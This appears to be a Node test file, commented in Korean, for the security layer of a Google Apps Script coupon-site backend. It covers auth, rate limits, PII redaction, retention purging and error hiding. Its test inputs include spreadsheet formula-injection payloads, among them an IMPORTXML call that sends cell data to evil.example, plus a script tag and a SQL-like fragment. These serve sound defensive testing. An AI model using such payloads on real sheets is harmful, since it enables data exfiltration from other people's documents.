// v6 보안: 공개 API 남용 방지 · 시트 수식 주입 차단 · 보관 기간 · 내부 오류 숨김 · 행 자동 확장
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { loadAppsScript } from './gas-harness.js';

const CODE = new URL('../../apps-script/Code.gs', import.meta.url).pathname;
const T0 = Date.parse('2026-10-28T03:00:00Z'); // KST 10/28 12:00
const MIN = 60 * 1000;
const DAY = 24 * 60 * MIN;
const SID = 'a1b2c3d4e5f6a7b8c9d0';

function boot(now = T0) {
  const gas = loadAppsScript(CODE, { now });
  gas.ctx.setup();
  return { gas, token: gas.props.get('COLLECTOR_TOKEN'), admin: gas.props.get('ADMIN_TOKEN') };
}
const rows = (gas, name) => gas.sheet(name).objects();
const finish = (gas, token, extra = {}) => gas.post({ action: 'run_finish', token, report: { run_id: 'r', state: 'success', finished_at: new Date(gas.clock.now).toISOString(), summary: {}, sources: [], ...extra } });

test('토큰 없이 쿠폰·소식·출처를 바꾸는 요청은 모두 거절, 토큰은 문자열만', () => {
  const { gas, token } = boot();
  for (const action of ['ingest', 'run_start', 'run_finish', 'sources', 'nutrition_ingest']) {
    assert.equal(gas.post({ action, coupons: [], items: [{ brand: 'x', name: 'y' }] }).error, 'unauthorized', action);
    assert.equal(gas.post({ action, token: [token] }).error, 'unauthorized', `${action}: 배열 토큰`);
    assert.equal(gas.post({ action, token: { toString: token } }).error, 'unauthorized', `${action}: 객체 토큰`);
  }
  assert.equal(gas.post({ action: 'metrics', token }).error, 'unauthorized', '수집기 토큰으로 관리 지표를 볼 수 없음');
  assert.equal(gas.ctx.doPost({ postData: { contents: '[1,2]' } }).content.includes('bad json'), true);
  // 공개 요청은 4KB까지
  const big = gas.post({ action: 'report', sid: SID, reason: '기타', memo: 'x'.repeat(5000) });
  assert.deepEqual(big, { ok: false, error: 'too large' });
  assert.equal(rows(gas, 'reports').length, 0);
  // 공개 쿠폰 응답에는 내부 필드가 없다
  const pub = gas.get({ action: 'coupons' });
  assert.equal(pub.ok, true);
  assert.ok(!JSON.stringify(pub).includes('COLLECTOR_TOKEN'));
});

test('이용 기록: 브라우저 id 형식 검사, 쿠폰 id 형식, 수식·제어문자 무력화', () => {
  const { gas } = boot();
  assert.equal(gas.post({ action: 'event', sid: 'short', type: 'visit' }).error, 'bad sid');
  assert.equal(gas.post({ action: 'event', sid: '<script>alert(1)</script>', type: 'visit' }).error, 'bad sid');
  assert.equal(gas.post({ action: 'event', type: 'visit' }).error, 'bad sid', 'id 없이는 기록하지 않음');
  const r = gas.post({ action: 'event', sid: SID, type: 'click', coupon_id: 'c_1"; DROP', brand: '=IMPORTXML("https://evil.example/?q="&A1,"//a")', value: 'line1\nline2\u0000‮' });
  assert.equal(r.ok, true);
  const [e] = rows(gas, 'events');
  assert.equal(e.sid, SID);
  assert.equal(e.coupon_id, '', '형식에 맞지 않는 쿠폰 id는 비움');
  assert.ok(e.brand.startsWith("'="), '수식으로 해석되지 않게 앞에 작은따옴표');
  assert.equal(e.brand.length, 31, '30자 + 작은따옴표');
  assert.equal(e.value, 'line1 line2', '줄바꿈은 공백, 제어문자·방향 바꾸기 문자는 제거');
  for (const lead of ['+', '-', '@', '  =']) {
    gas.post({ action: 'event', sid: SID, type: 'filter', value: `${lead}SUM(1,2)` });
    assert.ok(rows(gas, 'events').at(-1).value.startsWith("'"), lead);
  }
});

test('이용 기록 빈도 제한: 브라우저당 10분 120건, 전체 1시간 3000건 — 넘으면 조용히 버림', () => {
  const { gas } = boot();
  for (let i = 0; i < 120; i++) assert.equal(gas.post({ action: 'event', sid: SID, type: 'filter', value: `cat:${i}` }).dropped, undefined);
  const over = gas.post({ action: 'event', sid: SID, type: 'filter', value: 'over' });
  assert.deepEqual(over, { ok: true, dropped: true });
  assert.equal(rows(gas, 'events').length, 120);
  // 다른 브라우저는 그대로
  assert.equal(gas.post({ action: 'event', sid: 'zzzzzzzzzzzz', type: 'visit' }).dropped, undefined);
  // 10분이 지나면 다시
  gas.clock.now += 11 * MIN;
  assert.equal(gas.post({ action: 'event', sid: SID, type: 'visit' }).dropped, undefined);
  // 전체 상한에 닿으면 누구든 버림
  const hour = Math.floor(gas.clock.now / (3600 * 1000));
  gas.cache.set(`rl_event_a_${hour}`, '3000');
  assert.equal(gas.post({ action: 'event', sid: 'yyyyyyyyyyyy', type: 'visit' }).dropped, true);
});

test('제보: 브라우저당 1시간 5건, 메모의 전화번호·메일은 지우고 줄바꿈은 유지, 수식 무력화', () => {
  const { gas, admin } = boot();
  const send = (memo, reason = '가격이 달라요') => gas.post({ action: 'report', sid: SID, coupon_id: 'c_1', brand: '맥도날드', menu: '빅맥', reason, memo });
  assert.equal(send('앱에선 5,900원이에요.\n연락 주세요 010-1234-5678 / me@example.com').ok, true);
  assert.equal(send('=HYPERLINK("https://evil.example","눌러")').ok, true);
  assert.equal(send('+82 10 9876 5432 로 문자 주세요').ok, true);
  assert.equal(send('16,000원이 아니라 15,000원').ok, true);
  assert.equal(send('다섯 번째').ok, true);
  assert.deepEqual(send('여섯 번째'), { ok: false, error: 'too_many' });
  const rs = rows(gas, 'reports');
  assert.equal(rs.length, 5);
  assert.equal(rs[0].memo, '앱에선 5,900원이에요.\n연락 주세요 [전화번호 지움] / [메일 주소 지움]');
  assert.ok(rs[1].memo.startsWith("'=HYPERLINK"));
  assert.equal(rs[2].memo, '[전화번호 지움] 로 문자 주세요');
  assert.equal(rs[3].memo, '16,000원이 아니라 15,000원', '가격 숫자는 그대로');
  assert.equal(rs[0].status, '새 제보');
  // 한 시간이 지나면 다시 보낼 수 있음
  gas.clock.now += 61 * MIN;
  assert.equal(send('다시').ok, true);
  // 관리 화면은 지운 뒤의 메모만 본다
  const m = gas.post({ action: 'metrics', token: admin });
  assert.ok(!JSON.stringify(m.reports).includes('010-1234'));
});

test('동시에 몰리면(잠금 실패) 기록을 버리고, 제보는 다시 보내 달라고 알림', () => {
  const { gas } = boot();
  gas.lockBusy.value = true;
  assert.deepEqual(gas.post({ action: 'event', sid: SID, type: 'visit' }), { ok: true, dropped: true });
  assert.deepEqual(gas.post({ action: 'report', sid: SID, reason: '기타' }), { ok: false, error: 'busy' });
  gas.lockBusy.value = false;
  assert.equal(rows(gas, 'events').length, 0);
  assert.equal(gas.cache.size, 0, '잠금에 실패한 요청은 횟수 제한도 소모하지 않음');
});

test('공개 기록의 빈도 검사와 시트 쓰기는 같은 잠금 안에서 처리한다', () => {
  const { gas } = boot();
  let held = false;
  const getLock = gas.ctx.LockService.getScriptLock;
  gas.ctx.LockService.getScriptLock = () => {
    const lock = getLock();
    return { ...lock, tryLock: (ms) => { const ok = lock.tryLock(ms); held = ok; return ok; }, releaseLock: () => { held = false; lock.releaseLock(); } };
  };
  const getCache = gas.ctx.CacheService.getScriptCache;
  gas.ctx.CacheService.getScriptCache = () => {
    const cache = getCache();
    return { ...cache, put: (key, value, ttl) => { if (key.startsWith('rl_')) assert.equal(held, true); cache.put(key, value, ttl); } };
  };
  assert.equal(gas.post({ action: 'event', sid: SID, type: 'visit' }).ok, true);
  assert.equal(held, false);
});

test('탭의 마지막 행을 넘어도 기록이 멈추지 않음 (500행씩 늘림)', () => {
  const { gas, token } = boot();
  gas.sheet('events').maxRows = 3;
  for (let i = 0; i < 5; i++) assert.equal(gas.post({ action: 'event', sid: `sid_${i}_abcdef`, type: 'visit' }).ok, true);
  assert.equal(rows(gas, 'events').length, 5);
  assert.equal(gas.sheet('events').maxRows, 503);
  // 쿠폰 표 전체 쓰기도 마찬가지
  gas.sheet('run_log').maxRows = 1;
  assert.equal(finish(gas, token).ok, true);
  assert.equal(rows(gas, 'run_log').length, 1);
});

test('보관 기간: 이용 기록 180일·제보 365일이 지나면 수집 마무리 때 삭제', () => {
  const { gas, token, admin } = boot(T0 - 400 * DAY);
  const at = (days) => { gas.clock.now = T0 - days * DAY; };
  at(400); gas.post({ action: 'event', sid: 'old_browser_1', type: 'visit' }); gas.post({ action: 'report', sid: 'old_browser_1', reason: '기타', memo: '아주 옛날' });
  at(200); gas.post({ action: 'event', sid: 'old_browser_2', type: 'visit' }); gas.post({ action: 'report', sid: 'old_browser_2', reason: '기타', memo: '반년 전' });
  at(10); gas.post({ action: 'event', sid: 'new_browser_3', type: 'visit' });
  at(0);
  const r = finish(gas, token);
  assert.deepEqual(r.purged, { events: 2, reports: 1 });
  assert.deepEqual(rows(gas, 'events').map((e) => e.sid), ['new_browser_3']);
  assert.deepEqual(rows(gas, 'reports').map((e) => e.memo), ['반년 전']);
  const m = gas.post({ action: 'metrics', token: admin });
  assert.deepEqual(m.security.retention_days, { events: 180, reports: 365 });
  assert.ok(m.security.last_purge_at);
  // 전부 오래됐으면 표를 비움 (머리글은 유지)
  gas.clock.now = T0 + 400 * DAY;
  assert.deepEqual(finish(gas, token).purged, { events: 1, reports: 1 });
  assert.equal(rows(gas, 'events').length, 0);
  assert.equal(gas.sheet('events').data[0][0], 'ts');
});

test('보관 기간 정리: 오래된 행이 중간에 있어도 삭제하고 시각이 잘못된 행은 보존', () => {
  const { gas, token } = boot(T0 - 400 * DAY);
  gas.clock.now = T0 - 10 * DAY;
  gas.post({ action: 'event', sid: 'recent_user1', type: 'visit' });
  gas.clock.now = T0 - 400 * DAY;
  gas.post({ action: 'event', sid: 'old_user_one', type: 'visit' });
  gas.ctx.appendRow_('events', { ts: 'invalid', sid: 'unknown_user', type: 'visit' });
  gas.post({ action: 'event', sid: 'old_user_two', type: 'visit' });
  gas.clock.now = T0;
  assert.equal(finish(gas, token).purged.events, 2);
  assert.deepEqual(rows(gas, 'events').map((e) => e.sid), ['recent_user1', 'unknown_user']);
});

test('바로 갱신: 하루 6번까지 (00시 정시 수집과는 별개), 다음 날 다시', () => {
  const { gas, token, admin } = boot();
  gas.props.set('GITHUB_TOKEN', 'ghp_test');
  gas.props.set('GITHUB_REPO', 'Olsd0/among');
  for (let i = 0; i < 6; i++) {
    assert.equal(gas.post({ action: 'refresh' }).accepted, true, `${i + 1}번째`);
    gas.post({ action: 'run_start', token, run_id: `r${i}` });
    gas.clock.now += MIN;
    finish(gas, token);
    gas.clock.now += 11 * MIN;
  }
  const r = gas.post({ action: 'refresh' });
  assert.equal(r.accepted, false);
  assert.equal(r.reason, 'daily_limit');
  assert.equal(gas.fetches.length, 6);
  assert.equal(gas.post({ action: 'metrics', token: admin }).security.refresh_today, 6);
  // 정시 수집은 상한과 무관
  assert.equal(gas.ctx.scheduledCollect(), 'skip: 오늘 이미 수집함');
  gas.clock.now = T0 + DAY;
  assert.equal(gas.post({ action: 'refresh' }).accepted, true, '다음 날은 다시');
});

test('토큰 없는 요청에는 내부 오류 문구를 주지 않음, 토큰을 확인한 요청에는 자세히', () => {
  const { gas, token } = boot();
  gas.sheets.delete('coupons');
  gas.props.set('SCHEMA_VERSION', '99'); // 자동 복구(migrate)가 탭을 다시 만들지 않게
  assert.deepEqual(gas.get({ action: 'coupons' }), { ok: false, error: 'server_error' });
  gas.sheets.delete('events');
  assert.deepEqual(gas.post({ action: 'event', sid: SID, type: 'visit' }), { ok: false, error: 'server_error' });
  const r = gas.post({ action: 'ingest', token, run_id: 'r', coupons: [], sources_ok: [] });
  assert.equal(r.ok, false);
  assert.match(r.error, /시트 탭 없음/);
});
